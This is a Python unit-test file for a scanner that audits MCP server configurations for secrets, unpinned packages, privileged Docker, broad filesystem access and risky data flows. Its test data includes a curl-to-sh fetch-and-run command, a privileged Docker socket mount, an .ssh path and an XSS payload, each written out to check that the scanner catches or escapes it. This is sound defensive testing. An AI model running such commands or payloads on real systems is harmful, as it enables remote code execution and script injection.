import json, os, subprocess, sys, tempfile, unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from mcp_lantern import checks
from mcp_lantern import diff as diffmod
from mcp_lantern.analyze import analyze, load_annotations
from mcp_lantern.flows import compute_flows, smallest_fix
from mcp_lantern.htmlreport import to_html
from mcp_lantern.parse import ConfigError, load_file, strip_jsonc
from mcp_lantern.render import to_sarif, to_text

FAKE_GH = "ghp_" + "a1B2" * 9           # built at runtime: no real secret in the repo
FAKE_AWS = "AKIA" + "ABCDEFGHIJKLMNOP"


def write(tmp, obj, name="mcp.json", raw=None):
    p = os.path.join(tmp, name)
    with open(p, "w") as fh:
        fh.write(raw if raw is not None else json.dumps(obj))
    return p


class Parse(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def test_mcpservers_and_vscode_servers_keys(self):
        a = load_file(write(self.tmp, {"mcpServers": {"a": {"command": "x"}}}, "a.json"))
        b = load_file(write(self.tmp, {"servers": {"b": {"type": "http", "url": "https://h/mcp"}}}, "b.json"))
        self.assertEqual((a[0].kind, b[0].kind), ("stdio", "remote"))

    def test_nested_claude_json_projects(self):
        s = load_file(write(self.tmp, {"projects": {"/p": {"mcpServers": {"z": {"command": "c"}}}}}))
        self.assertEqual(s[0].name, "z")

    def test_jsonc_comments_and_trailing_commas(self):
        raw = '{ // c\n "mcpServers": { "a": { "command": "x", "args": ["http://not-a-comment"], }, }, /* b */ }'
        self.assertEqual(load_file(write(self.tmp, None, raw=raw))[0].args, ["http://not-a-comment"])

    def test_errors_are_clear(self):
        with self.assertRaises(ConfigError):
            load_file(write(self.tmp, None, raw="{nope"))
        with self.assertRaises(ConfigError):
            load_file(write(self.tmp, {"hello": 1}))
        with self.assertRaises(ConfigError):
            load_file(os.path.join(self.tmp, "missing.json"))

    def test_strip_jsonc_keeps_slashes_in_strings(self):
        self.assertEqual(json.loads(strip_jsonc('{"u": "a//b/*c*/"}'))["u"], "a//b/*c*/")


class Flows(unittest.TestCase):
    S = [{"id": "u", "caps": ["untrusted_input"]}, {"id": "p", "caps": ["private_data"]}, {"id": "e", "caps": ["egress"]}]

    def test_trifecta_across_three_servers(self):
        self.assertIn("LNT-F001", [f["rule"] for f in compute_flows(self.S)])

    def test_disabling_a_leg_clears_it(self):
        self.assertNotIn("LNT-F001", [f["rule"] for f in compute_flows(self.S, enabled={"u", "p"})])

    def test_single_server_can_hold_all_legs(self):
        one = [{"id": "x", "caps": ["untrusted_input", "private_data", "egress"]}]
        self.assertEqual(smallest_fix(one), (["x"], True))

    def test_smallest_fix_is_minimal(self):
        ids, exact = smallest_fix(self.S + [{"id": "e2", "caps": ["egress"]}])
        self.assertTrue(exact)
        self.assertEqual(len(ids), 1)               # removing u or p breaks everything; removing one egress does not
        self.assertIn(ids[0], ("u", "p"))

    def test_no_servers_no_flows(self):
        self.assertEqual(compute_flows([]), [])


class Checks(unittest.TestCase):
    def run_cfg(self, spec, name="s"):
        tmp = tempfile.mkdtemp()
        p = write(tmp, {"mcpServers": {name: spec}})
        return analyze(load_file(p))

    def titles(self, r):
        return [f["title"] for f in r["findings"]]

    def test_literal_secret_found_and_never_echoed(self):
        r = self.run_cfg({"command": "node", "args": ["s.js"], "env": {"GITHUB_TOKEN": FAKE_GH, "AWS_KEY": FAKE_AWS}})
        blob = json.dumps(r) + to_text(r) + to_sarif(r) + to_html(r)
        self.assertNotIn(FAKE_GH, blob)
        self.assertNotIn(FAKE_AWS, blob)
        self.assertTrue(any("GitHub token" in t for t in self.titles(r)))

    def test_env_reference_is_not_a_secret(self):
        r = self.run_cfg({"command": "node", "args": ["s.js"], "env": {"API_TOKEN": "${API_TOKEN}", "OTHER_KEY": "$OTHER"}})
        self.assertFalse([f for f in r["findings"] if f["rule"] == "LNT-C001"])

    def test_secret_in_args_is_hidden_in_launch_text(self):
        r = self.run_cfg({"command": "node", "args": ["s.js", FAKE_GH]})
        self.assertNotIn(FAKE_GH, r["servers"][0]["launch"])

    def test_unpinned_variants(self):
        for args, flagged in [(["-y", "pkg"], True), (["-y", "pkg@latest"], True), (["-y", "pkg@1.2.3"], False),
                              (["-y", "@s/pkg"], True), (["-y", "@s/pkg@1.2.3"], False)]:
            r = self.run_cfg({"command": "npx", "args": args})
            self.assertEqual(any(f["rule"] == "LNT-C002" for f in r["findings"]), flagged, args)
        self.assertFalse(any(f["rule"] == "LNT-C002" for f in self.run_cfg({"command": "uvx", "args": ["pkg==1.0"]})["findings"]))

    def test_docker_checks(self):
        r = self.run_cfg({"command": "docker", "args": ["run", "-i", "--rm", "--privileged", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img"]})
        rules = [f["rule"] for f in r["findings"]]
        self.assertEqual(rules.count("LNT-C006"), 2)
        self.assertIn("LNT-C002", rules)       # untagged image

    def test_docker_pinned_digest_ok(self):
        r = self.run_cfg({"command": "docker", "args": ["run", "-i", "ghcr.io/x/y@sha256:" + "0" * 64]})
        self.assertFalse(any(f["rule"] == "LNT-C002" for f in r["findings"]))

    def test_http_remote_flagged_localhost_not(self):
        self.assertTrue(any(f["rule"] == "LNT-C004" for f in self.run_cfg({"url": "http://example.org/mcp"})["findings"]))
        self.assertFalse(any(f["rule"] == "LNT-C004" for f in self.run_cfg({"url": "http://localhost:8080/mcp"})["findings"]))

    def test_shell_wrapper_and_curl_pipe(self):
        r = self.run_cfg({"command": "bash", "args": ["-c", "curl https://x.example/i.sh | sh"]})
        self.assertEqual([f["rule"] for f in r["findings"]].count("LNT-C003"), 2)

    def test_broad_filesystem_root(self):
        r = self.run_cfg({"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@1.0.0", "/home/u/.ssh"]}, "files")
        self.assertTrue(any(f["rule"] == "LNT-C007" for f in r["findings"]))
        ok = self.run_cfg({"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem@1.0.0", "/home/u/project"]}, "files")
        self.assertFalse(any(f["rule"] == "LNT-C007" for f in ok["findings"]))

    def test_unknown_server_has_no_caps_and_is_flagged(self):
        r = self.run_cfg({"command": "node", "args": ["mine.js"]})
        self.assertEqual(r["servers"][0]["caps"], [])
        self.assertTrue(any(f["rule"] == "LNT-C008" for f in r["findings"]))

    def test_annotations_override_and_validate(self):
        tmp = tempfile.mkdtemp()
        ann = write(tmp, {"s": {"caps": ["exec"]}}, "a.json")
        p = write(tmp, {"mcpServers": {"s": {"command": "node", "args": ["m.js"]}}})
        r = analyze(load_file(p), load_annotations(ann))
        self.assertEqual(r["servers"][0]["caps"], ["exec"])
        with self.assertRaises(ValueError):
            load_annotations(write(tmp, {"s": {"caps": ["nonsense"]}}, "bad.json"))

    def test_duplicate_names_across_files_get_distinct_ids(self):
        t1, t2 = tempfile.mkdtemp(), tempfile.mkdtemp()
        s = load_file(write(t1, {"mcpServers": {"x": {"command": "a"}}})) + load_file(write(t2, {"mcpServers": {"x": {"command": "b"}}}))
        ids = [row["id"] for row in analyze(s)["servers"]]
        self.assertEqual(len(set(ids)), 2)


class Outputs(unittest.TestCase):
    def setUp(self):
        ex = os.path.join(os.path.dirname(__file__), "..", "examples", "risky.mcp.json")
        self.r = analyze(load_file(ex))

    def test_html_is_self_contained_and_inert(self):
        h = to_html(self.r)
        self.assertNotIn("http://", h.split('id="data"')[0].replace("http://www.w3.org", ""))  # no external loads in markup/CSS
        self.assertNotRegex(h, r'(src|href)="https?://')

    def test_html_escapes_markup_in_config(self):
        tmp = tempfile.mkdtemp()
        evil = "</script><img src=x onerror=alert(1)>"
        r = analyze(load_file(write(tmp, {"mcpServers": {evil: {"command": "node", "args": [evil]}}})))
        data = to_html(r).split('id="data">')[1].split("</script>")[0]
        self.assertNotIn("<", data)

    def test_sarif_shape(self):
        d = json.loads(to_sarif(self.r))
        self.assertEqual(d["version"], "2.1.0")
        self.assertTrue(d["runs"][0]["results"])
        ids = {r["id"] for r in d["runs"][0]["tool"]["driver"]["rules"]}
        self.assertTrue(all(res["ruleId"] in ids for res in d["runs"][0]["results"]))


class Cli(unittest.TestCase):
    def run_cli(self, *a):
        env = dict(os.environ, PYTHONPATH=os.path.join(os.path.dirname(__file__), "..", "src"))
        return subprocess.run([sys.executable, "-m", "mcp_lantern", *a], capture_output=True, text=True, env=env)

    def ex(self):
        return os.path.join(os.path.dirname(__file__), "..", "examples", "risky.mcp.json")

    def test_exit_codes(self):
        self.assertEqual(self.run_cli(self.ex()).returncode, 0)
        self.assertEqual(self.run_cli(self.ex(), "--fail-on", "high").returncode, 1)
        self.assertEqual(self.run_cli().returncode, 2)
        self.assertEqual(self.run_cli("/nonexistent.json").returncode, 2)

    def test_html_requires_output(self):
        self.assertEqual(self.run_cli(self.ex(), "--format", "html").returncode, 2)


class Baseline(unittest.TestCase):
    """--baseline: report only what became riskier or safer since an earlier config."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.safe = write(self.tmp, {"mcpServers": {
            "files": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/srv/docs"]}}}, "safe.json")
        self.risky = write(self.tmp, {"mcpServers": {
            "files": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/srv/docs"]},
            "web": {"command": "uvx", "args": ["mcp-server-fetch"]}}}, "risky.json")

    def result(self, path):
        return analyze(load_file(path))

    def test_new_server_introduces_flow(self):
        d = diffmod.compute_diff(self.result(self.safe), self.result(self.risky))
        self.assertEqual(d["servers_added"], ["web"])
        self.assertEqual({f["rule"] for f in d["flows_introduced"]}, {"LNT-F001", "LNT-F003", "LNT-F004"})
        self.assertEqual(d["servers_removed"], [])

    def test_reverse_direction_clears_flow(self):
        d = diffmod.compute_diff(self.result(self.risky), self.result(self.safe))
        self.assertEqual(d["servers_removed"], ["web"])
        self.assertEqual(d["flows_introduced"], [])
        self.assertTrue(d["flows_cleared"])

    def test_identical_configs_have_no_diff(self):
        d = diffmod.compute_diff(self.result(self.risky), self.result(self.risky))
        self.assertTrue(diffmod.is_empty(d))
        self.assertIsNone(diffmod.worst_new_severity(d))
        self.assertIn("No differences", diffmod.to_text(d))

    def test_launch_change_is_reported(self):
        changed = write(self.tmp, {"mcpServers": {
            "files": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]},
            "web": {"command": "uvx", "args": ["mcp-server-fetch"]}}}, "changed.json")
        d = diffmod.compute_diff(self.result(self.risky), self.result(changed))
        self.assertEqual([c["name"] for c in d["servers_changed"]], ["files"])

    def test_cli_fail_on_counts_only_new_risk(self):
        env = dict(os.environ, PYTHONPATH=os.path.join(os.path.dirname(__file__), "..", "src"))
        def run(*a):
            return subprocess.run([sys.executable, "-m", "mcp_lantern", *a], capture_output=True, text=True, env=env)
        # Same config on both sides: existing risk is not "new", so --fail-on passes.
        same = run(self.risky, "--baseline", self.risky, "--fail-on", "medium")
        self.assertEqual(same.returncode, 0, same.stderr)
        # Risk introduced since the baseline fails the gate.
        worse = run(self.risky, "--baseline", self.safe, "--fail-on", "medium")
        self.assertEqual(worse.returncode, 1, worse.stdout + worse.stderr)
        self.assertIn("Changes since baseline", worse.stdout)
        js = run(self.risky, "--baseline", self.safe, "--format", "json")
        self.assertIn("diff", json.loads(js.stdout))
        self.assertEqual(run(self.risky, "--baseline", self.safe, "--format", "sarif").returncode, 2)
        self.assertEqual(run(self.risky, "--baseline", "/nonexistent.json").returncode, 2)


if __name__ == "__main__":
    unittest.main()
